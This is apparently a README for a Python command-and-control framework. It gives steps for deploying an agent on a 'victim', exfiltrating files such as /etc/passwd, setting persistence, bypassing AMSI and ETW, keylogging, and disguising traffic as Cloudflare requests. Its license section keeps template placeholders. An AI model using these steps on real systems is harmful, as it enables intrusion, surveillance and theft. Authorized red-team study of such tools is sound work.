# Python C2 Framework

A complete, self-contained Command & Control framework written in **pure Python standard library**. Zero pip installs on the victim. One file to deploy. TLS-encrypted. Cert-pinned. Multi-operator with RBAC.

> **⚠️ LEGAL USE ONLY — READ THIS FIRST**
>
> This tool is for **authorized penetration testing, red team engagements, CTF competitions, and lab research** only.
>
> You must have **explicit, written permission** from the owner of any system you test with this software. Unauthorized access to computer systems is illegal under laws including (but not limited to) the U.S. Computer Fraud and Abuse Act (CFAA), the UK Computer Misuse Act, and the EU Directive on Attacks Against Information Systems.
>
> The author(s) accept **no liability** for misuse, damage, or legal consequences arising from the use of this code. **You are solely responsible** for your actions.

---

## Table of Contents

- [Features](#features)
- [Architecture](#architecture)
- [Requirements](#requirements)
- [Quick Start](#quick-start)
- [Deployment](#deployment)
- [Command Reference](#command-reference)
- [Modules](#modules)
- [Transports](#transports)
- [Security Model](#security-model)
- [Operator Roles](#operator-roles)
- [Malleable Profiles](#malleable-profiles)
- [Troubleshooting](#troubleshooting)
- [FAQ](#faq)
- [License](#license)

---

## Features

### Zero victim dependencies
The victim runs **one file** (`agent.py`) using **only Python's standard library**. No `pip`, no `cryptography`, no `requests`, no compiler, no internet connection. If a machine has Python 3.8+, it runs.

### TLS with cert pinning
All traffic is encrypted with **TLS 1.2+** (AES-256-GCM, Ephemeral Diffie-Hellman key exchange — perfect forward secrecy). The agent **pins** the server certificate by SHA-256 fingerprint, preventing MITM attacks even on hostile networks.

### Three transports
- **TCP+TLS** (port 4444) — persistent socket, lowest latency
- **HTTPS** (port 8443) — blends with web traffic, egress-firewall friendly
- **Operator TLS** (port 5555) — separated management plane

### Operator features
- Local admin console (runs on server)
- Remote operator CLI with RBAC login
- Three roles: `admin`, `operator`, `viewer`
- SQLite backend
- Malleable HTTP profiles
- Loot storage with per-agent namespacing
- Offline watchdog (agents auto-marked dead after 5 min)

### Post-exploitation
Shell, `sysinfo`, `ps`, `env`, `download`, `upload`, persistence (cron/rc/systemd/registry/schtask/startup/launchagent), privilege escalation enumeration, AMSI bypass, ETW patching, screenshot (optional), keylogger (optional).

---

## Architecture

```
                    ┌──────────────────────────────────────┐
                    │         teamserver (server.py)       │
                    │                                      │
   ┌──────────┐     │   ┌──────────┐    ┌──────────────┐   │
   │  agent   │─────┼──▶│ TCP+TLS  │    │   HTTPS      │   │
   │ (victim) │     │   │  :4444   │    │   :8443      │   │
   │ 1 file   │     │   └──────────┘    └──────────────┘   │
   │ pure std │     │                                      │
   └──────────┘     │   ┌──────────┐    ┌──────────────┐   │
                    │   │ Operator │    │   SQLite     │   │
   ┌──────────┐     │   │ TLS :5555│    │   (c2.db)    │   │
   │ operator │─────┼──▶│          │    └──────────────┘   │
   │ remote   │     │   └──────────┘                       │
   └──────────┘     │                                      │
                    │   ┌─────────────────────────────────┐│
                    │   │ Local admin console (terminal)  ││
                    │   └─────────────────────────────────┘│
                    └──────────────────────────────────────┘
```

---

## Requirements

| Component | Requirement |
|---|---|
| **Server** | Python 3.8+ · `openssl` command **or** `cryptography` pip package (one of the two, only for TLS cert generation) |
| **Victim** | **Python 3.8+ only** — nothing else |
| **Operator** | Python 3.8+ |

That's the entire dependency list. No `requirements.txt` needed.

---

## Quick Start

### On the attacker machine

```bash
git clone https://github.com/ravichandran3/Python-C2-Framework.git
cd Python-C2-Framework

python3 server.py
# First run:
#   - Prompts to set admin password
#   - Auto-generates server.crt + server.key
#   - Prints cert fingerprint (COPY THIS)
#   - Starts listeners on 4444, 8443, 5555
```

The server prints:

```
════════════════════════════════════════════════════════════════════
  Server cert SHA-256 fingerprint:
  a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2

  Copy this to the victim:
    python3 agent.py --host <THIS_IP> --cert-fp a1b2c3d4...
════════════════════════════════════════════════════════════════════
```

### On the victim machine

Copy **only** `agent.py` to the victim:

```bash
# From attacker machine
scp agent.py user@victim:/tmp/
```

Then on the victim:

```bash
python3 /tmp/agent.py --host <SERVER_IP> --cert-fp <FINGERPRINT>
```

That's it. The agent registers, appears in `list`, and starts beaconing.

### Operate

On the attacker (server terminal):

```
[c2:none] > list
[c2:none] > use <agent_id_prefix>
[c2:<id>] > sysinfo
[c2:<id>] > shell whoami
[c2:<id>] > download /etc/passwd
```

---

## Deployment

### File transfer matrix

| File | Attacker | Victim |
|---|:---:|:---:|
| `server.py` | ✅ | ❌ |
| `agent.py` | ⚠️ (for staging) | ✅ |
| `common.py` | ✅ | ❌ (agent is self-contained) |
| `operator.py` | ✅ | ❌ |
| `stager.py` | ⚠️ | ✅ (optional) |
| `server.crt` | ✅ (auto-generated) | ❌ |
| `server.key` | ✅ (auto-generated, **KEEP SECRET**) | ❌ |
| `c2.db` | ✅ (auto-generated) | ❌ |

### Victim checklist

Before running the agent, verify:

1. **Python 3.8+** exists on the victim: `python3 --version`
2. **Network reachable**: from the victim, `python3 -c "import socket; socket.create_connection(('SERVER_IP', 8443), timeout=5)"` succeeds
3. **Cert fingerprint** copied correctly from server banner
4. **No `pip install` needed** — verify: `python3 -c "import ssl, socket, http.client, json, base64, hashlib, subprocess, platform, uuid; print('ok')"` prints `ok`

That's all. The agent will retry every 10s → 20s → 40s → … → 300s max.

### Offline victim (no internet, no Python packages)

This is the default — the agent has **no external dependencies**. It will run identically with or without internet.

If the victim **doesn't have Python** at all, you have three options (outside the scope of this framework):

1. Deploy the machine's system Python if it exists (most Linux/macOS have it)
2. Use an alternative language agent (Go, C) that compiles to a native binary
3. PyInstaller the agent on the attacker (adds ~15 MB, but bundled Python)

Options 1 and 2 are professional; option 3 is what most people do.

### Optional modules on victim

`screenshot` and `keylog_*` require optional packages **only if you use those commands**:

| Module | Extra package on victim |
|---|---|
| `screenshot` | `pip install pillow` (or the `import`/`scrot` command on Linux) |
| `keylog_start` | `pip install pynput` |

**You don't need either** for shell, download, upload, sysinfo, privesc, persistence, AMSI, or ETW. Those work with zero extra installs.

If the victim has no internet, just don't use those two modules — or drop the wheel onto the victim manually (`pip download` on attacker → `scp` → `pip install --no-index --find-links=. pillow pynput`).

---

## Command Reference

### Agent management
| Command | Description |
|---|---|
| `list` | Show all agents |
| `use <prefix>` | Select agent by ID prefix |
| `back` | Deselect |

### Tasking (queued, delivered on next beacon)
| Command | Description |
|---|---|
| `shell <cmd>` | Execute shell command |
| `sysinfo` | Hostname, user, OS, arch, PID, machine_id |
| `ps` | Process list (`tasklist`/`ps aux`) |
| `env` | Environment variables |
| `download <remote>` | Exfil file → `loot/` |
| `upload <local> <remote>` | Push file to agent |
| `persist <kind>` | See persistence table below |
| `privesc` | Privilege escalation enumeration |
| `amsi` | Windows AMSI bypass |
| `etw` | Windows ETW patch |
| `screenshot` | Screen capture (needs pillow) |
| `keylog_start` / `dump` / `stop` | Keylogger (needs pynput) |
| `results` | Recent results for selected agent |

### Persistence kinds
| Kind | OS | Mechanism |
|---|---|---|
| `cron` | Linux/macOS | User crontab, every 10 min |
| `rc` | Linux/macOS | `~/.bashrc` append |
| `systemd` | Linux | user systemd service |
| `registry` | Windows | `HKCU\...\Run` |
| `schtask` | Windows | Scheduled task every 30 min |
| `startup` | Windows | Startup folder copy |
| `launchagent` | macOS | LaunchAgent plist |

### Operator management (admin only)
| Command | Description |
|---|---|
| `list_operators` | Show all operators |
| `add_operator <u> <p> <role>` | Add operator (`admin`/`operator`/`viewer`) |
| `remove_operator <u>` | Remove operator |

### Profiles (admin only)
| Command | Description |
|---|---|
| `list_profiles` | Show all profiles |
| `add_profile <path.json>` | Add profile from JSON file |

---

## Modules

| Module | Platform | Description |
|---|---|---|
| `shell` | all | `subprocess.run` with 180s timeout |
| `sysinfo` | all | Platform info via `platform` |
| `ps` | all | `tasklist` / `ps aux` |
| `env` | all | Dump `os.environ` |
| `download` | all | Base64-encode file (a few MB max) |
| `upload` | all | Base64-decode + write |
| `persist` | all | Cron/rc/systemd/registry/schtask/startup/launchagent |
| `privesc` | all | `id`, `sudo -l`, SUID scan, kernel, cron (Linux) / `whoami /priv`, `systeminfo`, unquoted service paths (Windows) |
| `amsi` | Windows | Patches `AmsiScanBuffer` |
| `etw` | Windows | Patches `EtwEventWrite` (32/64-bit aware) |
| `screenshot` | all | Pillow or ImageMagick/scrot |
| `keylog_start`/`dump`/`stop` | all | `pynput.keyboard.Listener` |

---

## Transports

### TCP+TLS (port 4444)
- Single persistent socket
- 4-byte big-endian length prefix on every message
- Server replies on same connection
- Fastest, but easier for NDR to spot (persistent outbound TLS)

### HTTPS (port 8443)
- Stateless POST requests, one per message
- `X-Agent-Token` header authenticates beacon/result
- Blends with web traffic
- Egress-firewall friendly

### Comparison
| | Speed | Evasion | Persistence on wire |
|---|---|---|---|
| TCP+TLS | fastest | low | one long-lived connection |
| HTTPS | fast | best | repeated POSTs |

---

## Security Model

### Encryption
All traffic is encrypted by **TLS 1.2+** (Python's `ssl` module uses OpenSSL under the hood, which provides AES-256-GCM, ChaCha20-Poly1305, and X25519/ECDHE ephemeral key exchange by default). Perfect forward secrecy is enabled — capturing the traffic and the server key later still does **not** decrypt the traffic.

### Authentication
The agent pins the server certificate's SHA-256 fingerprint. On connection, the agent hashes the peer DER cert and compares it to the pinned value. Any MITM must present a certificate whose fingerprint matches, which requires knowing the server's private key.

### Session tokens
After registration, the server issues a random 24-byte session token. The token is required for every beacon and every result submission. Tokens are rotated on every reconnect. The token lives in memory only on the agent side (never written to disk).

### What is NOT done
- **No app-layer crypto.** If you need protection against full traffic capture with future quantum compromise, add post-quantum KEM on top.
- **No agent code signing.** If the victim has EDR that checks binary signatures, consider that a separate engagement problem.
- **No sandbox escape.** The agent runs as the same user that launched it. For privilege escalation, use the `privesc` module + manual work.

---

## Operator Roles

| Action | `viewer` | `operator` | `admin` |
|---|:---:|:---:|:---:|
| `list` / `use` / `results` | ✅ | ✅ | ✅ |
| Task agents | ❌ | ✅ | ✅ |
| Manage operators | ❌ | ❌ | ✅ |
| View profiles | ✅ | ✅ | ✅ |
| Add profiles | ❌ | ❌ | ✅ |

Passwords are hashed with **PBKDF2-HMAC-SHA256, 200,000 iterations**, stored as `salt:hash` in the `operators` table.

---

## Malleable Profiles

A malleable profile changes the HTTP URIs and headers the agent uses, so requests blend with target-specific web traffic.

### Example (`profiles/cloudflare.json`)

```json
{
  "name": "cloudflare_cdn",
  "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "register_uri": "/cdn-cgi/trace/auth",
  "beacon_uri": "/cdn-cgi/trace/refresh",
  "result_uri": "/cdn-cgi/trace/log",
  "headers": {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "X-Forwarded-For": "127.0.0.1"
  }
}
```

Register it from either console (admin only):

```
[c2:none] > add_profile /path/to/profiles/cloudflare.json
```

**Note:** currently the agent uses hard-coded default URIs (`/api/v1/auth/login` etc.). To use a custom profile, edit `HttpsTransport.REGISTER_URI` and `BEACON_URI` and `RESULT_URI` in `agent.py` to match the profile's URIs on the server.

---

## Troubleshooting

### `agent` never appears in `list`

1. Check the victim can reach the server port:
   ```bash
   python3 -c "import socket; socket.create_connection(('SERVER_IP', 8443), timeout=5)"
   ```
2. Verify the cert fingerprint exactly matches (copy-paste from banner)
3. Check the server console — registration attempts print to server stdout

### `[!] cert fingerprint mismatch`

The pin doesn't match. Either:
- Copy-paste error — recopy from server banner
- Server regenerated its cert (deleted `server.crt`/`server.key`) — recopy
- MITM — verify network

### `http 401` on beacon

The `X-Agent-Token` is missing or wrong. The token is issued once at registration and rotated on reconnect. If this happens repeatedly:
- The server may have been restarted (in-memory tokens lost)
- The agent was re-registered as a new machine (new `machine_id`)

**Fix:** just wait — the agent reconnects and gets a fresh token.

### Agent offline in `list` but still running

The `BEACON_TIMEOUT = 300` seconds watchdog marks agents dead after 5 minutes of no beacon. If your agent is slower than that (very high jitter), increase `BEACON_TIMEOUT` at the top of `server.py`.

### `pip` not on victim, need screenshot/keylog

Those two modules need `pillow` and `pynput`. If the victim has no internet:
```bash
# On attacker
pip download -d ./wheels pillow pynput --platform win_amd64 --python-version 3.11 --only-binary=:all:

# Copy wheels to victim, then
pip install --no-index --find-links=./wheels pillow pynput
```

Or use the stdlib alternatives:
- `screenshot` on Linux: `apt install scrot` → works without pillow
- `keylog_start`: only via pynput (no stdlib alternative)

### Server crash: `Address already in use`

```
sudo lsof -i :4444
kill <PID>
```

---

## FAQ

**Q: Does the victim need internet?**
No. The agent has zero external dependencies. It only needs to reach the server over the local network.

**Q: Does the victim need `pip install`?**
No. The victim runs `python3 agent.py` with zero installs.

**Q: Which file goes on the victim?**
Just `agent.py`. That's it.

**Q: Which file goes on the attacker?**
Everything except `agent.py` goes on the attacker. Copy `agent.py` from the attacker to the victim.

**Q: Is the traffic encrypted?**
Yes — TLS 1.2+ with AES-256-GCM. Equivalent to the encryption of any modern HTTPS website.

**Q: What happens if the server key is compromised?**
If the attacker captured past traffic, TLS with perfect forward secrecy means past sessions stay encrypted. Future sessions are compromised.

**Q: What if the victim doesn't have Python at all?**
Then this framework won't work — you need a compiled binary. Options are Go/C agent, or PyInstaller bundling. Python 3.8+ is common on Linux/macOS; on Windows it's less common (but Python-based tools often work if the target has Python from some dev workflow).

**Q: Can I add a new module?**
Yes. Add a handler function in `agent.py` `_execute_task()` dispatch, and a whitelist entry in `server.py` `process_command`. That's it.

---

## License

**This project is source-available, not open-source.**

Copyright (c) 2026 [Your Name]. All rights reserved.

This software is licensed under the **Polyform Strict License 1.0.0** (`LICENSE` file in this repository).

### What you ARE permitted to do:
- **View** the source code.
- **Use** the software for **personal, non-commercial purposes** (research, private study, testing, hobby projects, educational use).

### What you are expressly PROHIBITED from doing:
- **Modifying**, altering, or creating derivative works based on this software.
- **Distributing** or redistributing this software (or any portion of it) to any third party, in any form.

### Important notes on the license:
- **This license is free.** You do not need to purchase anything. The Polyform Project publishes it at no cost for anyone to use. [reference:0]
- **This license makes your project "source-available," not "open-source."** Open-source licenses (MIT, Apache, GPL, etc.) all allow modification and redistribution. The Polyform Strict license does not.
- **GitHub's platform features (like forking) operate under GitHub's Terms of Service, not your license.** While your license legally prohibits modification and redistribution, GitHub may still allow users to "fork" your repository on the platform. The license restricts what they can legally do with that fork.

### Legal Notice
This software is provided for authorized security testing and educational purposes only. You must have explicit, written permission from the owner of any system you test. Unauthorized use is illegal.

---

## Contact & Security

If you discover a security issue in this project, please open an issue on this repository. Please do not use this tool against systems you do not own or have explicit permission to test.

**Use at your own risk. You are solely responsible for your actions.**
